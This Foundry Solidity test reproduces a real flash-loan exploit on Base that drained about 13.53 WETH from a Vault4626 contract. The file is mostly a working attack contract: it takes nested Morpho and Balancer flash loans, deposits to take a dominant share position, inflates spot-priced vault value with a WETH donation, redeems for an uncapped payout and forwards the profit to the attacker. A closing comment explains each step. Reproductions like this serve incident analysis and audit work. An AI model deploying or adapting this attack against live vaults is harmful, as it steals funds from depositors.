// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";

// @KeyInfo - Total Lost : 13.53 WETH
// Attacker : 0xa27eae743cd8c03e9b7c25ebf43dadbbc6df9bfa
// Attack Contract : 0x47e775b8f175034b22fba3a0f5b9e0f02551af3c
// Vulnerable Contract : 0xd08579102fc28355c5839019b730ce58f84e6a4d (Vault4626 impl, proxy 0x72dbaa8a)
// Attack Tx : https://basescan.org/tx/0x2f2e12fbdf541c28f3667153e5338f73a313096338dc5ca592453566debcd790

// @Info
// Vulnerable Contract Code : https://basescan.org/address/0xd08579102fc28355c5839019b730ce58f84e6a4d#code

// @Analysis
// Twitter Guy :
//
// Vault4626 prices the non-asset (WETH) leg of share value at the UniswapV3 pool SPOT tick and
// lets totalAssets() be inflated by a same-tx token donation. redeem() pays the non-asset leg at
// the RAW withdrawn amount with no cap tying (asset + non-asset) to the redeemer's fair pro-rata
// value, and has no same-block deposit->redeem guard. A flash-funded depositor mints a dominant
// share position, donates WETH to inflate redeemable value, and redeems for more than deposited.

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IMorpho {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData)
        external;
}

interface IVault4626 {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function balanceOf(address owner) external view returns (uint256);
}

interface IUniswapV3Pool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

contract ContractTest is BaseTestWithBalanceLog {
    IERC20 constant USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    IERC20 constant WETH = IERC20(0x4200000000000000000000000000000000000006);
    IMorpho constant MORPHO = IMorpho(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);
    IBalancerVault constant BALANCER = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IVault4626 constant VAULT = IVault4626(0x72dbAA8A09d71D09c6De0de439968e1E7c122020);
    IUniswapV3Pool constant POOL = IUniswapV3Pool(0x6c561B446416E1A00E8E93E221854d6eA4171372);


    function setUp() public {
        vm.createSelectFork("base", 47_958_574);
        attacker = 0xA27eAE743Cd8C03E9b7c25ebF43DADbBC6Df9bFA;
        fundingToken = address(WETH);
        vm.label(address(VAULT), "Vault4626");
        vm.label(address(POOL), "UniV3 WETH/USDC");
        vm.label(attacker, "Attacker");
    }

    function testExploit() public balanceLog2(attacker) {
        Exploit exploit = new Exploit();
        vm.prank(attacker);
        exploit.run(attacker);

        // attacker EOA must net the historical 13.53 WETH profit
        assertGe(WETH.balanceOf(attacker), 13 ether, "expected >=13 WETH profit");
    }
}

contract Exploit {
    IERC20 constant USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    IERC20 constant WETH = IERC20(0x4200000000000000000000000000000000000006);
    IMorpho constant MORPHO = IMorpho(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);
    IBalancerVault constant BALANCER = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IVault4626 constant VAULT = IVault4626(0x72dbAA8A09d71D09c6De0de439968e1E7c122020);
    IUniswapV3Pool constant POOL = IUniswapV3Pool(0x6c561B446416E1A00E8E93E221854d6eA4171372);

    // Flash-loan sizing chosen by the attacker: deposit must dwarf the ~21,945 USDC vault TVL to
    // mint a dominant share, and the WETH donation sets the redeemable-value inflation. Kept as the
    // historical amounts so the on-chain pool math reproduces the exact profit.
    uint256 constant DEPOSIT_USDC = 1_755_018_731_120; // 1,755,018.73 USDC borrowed from Morpho
    uint256 constant DONATION_WETH = 12.92 ether; // borrowed from Balancer, donated to the vault
    uint160 constant MAX_SQRT_RATIO = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_342 - 1;

    address profitReceiver;

    function run(address receiver) external {
        profitReceiver = receiver;
        // step 1: borrow USDC from Morpho; exploit continues in onMorphoFlashLoan
        MORPHO.flashLoan(address(USDC), DEPOSIT_USDC, "");
        // step 8: forward realized WETH profit to the attacker EOA
        WETH.transfer(profitReceiver, WETH.balanceOf(address(this)));
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata) external {
        // step 2: nest a WETH flash loan from Balancer; exploit continues in receiveFlashLoan
        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = address(WETH);
        amounts[0] = DONATION_WETH;
        BALANCER.flashLoan(address(this), tokens, amounts, "");
        // step 7: repay Morpho via its post-callback pull
        USDC.approve(address(MORPHO), assets);
    }

    function receiveFlashLoan(address[] calldata, uint256[] calldata amounts, uint256[] calldata, bytes calldata)
        external
    {
        // step 3: deposit borrowed USDC -> mint a dominant share position
        USDC.approve(address(VAULT), DEPOSIT_USDC);
        VAULT.deposit(DEPOSIT_USDC, address(this));

        // step 4: donate WETH to the vault; totalAssets() (spot-priced) inflates immediately
        WETH.transfer(address(VAULT), DONATION_WETH);

        // step 5: redeem every share -> over-pays USDC (inflated) and raw WETH (uncapped)
        VAULT.redeem(VAULT.balanceOf(address(this)), address(this), address(this));

        // step 6: swap the USDC surplus (everything above the Morpho repayment) into WETH
        uint256 surplusUsdc = USDC.balanceOf(address(this)) - DEPOSIT_USDC;
        POOL.swap(address(this), false, int256(surplusUsdc), MAX_SQRT_RATIO, "");

        // repay Balancer (zero fee on Base)
        WETH.transfer(address(BALANCER), amounts[0]);
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        // pay the owed token to the pool; selling token1 (USDC) for token0 (WETH)
        if (amount0Delta > 0) USDC.transfer(address(POOL), uint256(amount0Delta));
        if (amount1Delta > 0) USDC.transfer(address(POOL), uint256(amount1Delta));
    }
}

/*
 * ## Proof Explanation
 *
 * testExploit proves the Vault4626 redeem overpayment on Base (impl 0xd0857910):
 *
 * 1. Borrow 1,755,018.73 USDC (Morpho) and 12.92 WETH (Balancer), all atomic in one tx.
 * 2. deposit() 1.755M USDC into a vault holding only ~21,945 USDC -> attacker owns ~98.8% of shares.
 * 3. Donate 12.92 WETH straight to the vault. totalAssets() values that WETH at the pool SPOT tick
 *    (twapWindowSeconds == 0), so convertToAssets(shares) jumps within the same transaction.
 * 4. redeem() all shares: the vault pays ~1,771,858.84 USDC (inflated convertToAssets, ~16,840 USDC
 *    over the deposit) PLUS 15.825 WETH as the raw, uncapped non-asset leg.
 * 5. Swap the ~16,840 USDC surplus for ~10.62 WETH, repay Balancer 12.92 WETH, repay Morpho 1.755M USDC.
 * 6. ~13.53 WETH remains and is forwarded to the attacker EOA.
 *
 * assertGe(WETH.balanceOf(attacker), 13 ether):
 *   USDC is fully repaid to Morpho (nets zero); the entire profit is WETH drained from the vault's
 *   strategy LP + the recaptured donation inflation. Fails if the vault caps the non-asset payout or
 *   blocks same-block deposit->redeem (the post-incident patch 0x123ed18f).
 */
